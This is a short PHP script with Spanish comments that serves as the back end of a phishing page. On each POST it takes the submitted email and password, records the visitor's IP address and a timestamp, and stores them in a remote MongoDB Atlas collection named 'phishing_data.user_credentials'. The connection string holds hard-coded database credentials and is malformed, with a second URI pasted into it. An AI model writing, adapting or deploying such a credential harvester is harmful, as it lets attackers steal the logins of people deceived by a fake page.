<?php

// Cargar la librería de MongoDB
require 'vendor/autoload.php';

// URI de conexión a MongoDB Atlas
$uri = "mongodb://CHICO_CP:CHICO_CP@chicosp.qgyvr.mongodb.net/?retryWrites=true&w=majority&appName=CHICOSP
MONGO_URI=mongodb://CHICO_SP:CHICO_CP@videojuego-shard-00-00.q8k6p.mongodb.net:27017/?ssl=true&authSource=admin&retryWrites=true&w=majority";

// Conectar a MongoDB
$client = new MongoDB\Client($uri);
$collection = $client->phishing_data->user_credentials;

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Capturar la IP
    $ip = $_SERVER['REMOTE_ADDR'];

    // Crear un documento para MongoDB
    $document = [
        'email' => $email,
        'password' => $password,
        'ip' => $ip,
        'date' => new MongoDB\BSON\UTCDateTime()
    ];

    // Insertar el documento en MongoDB
    $collection->insertOne($document);

}
?>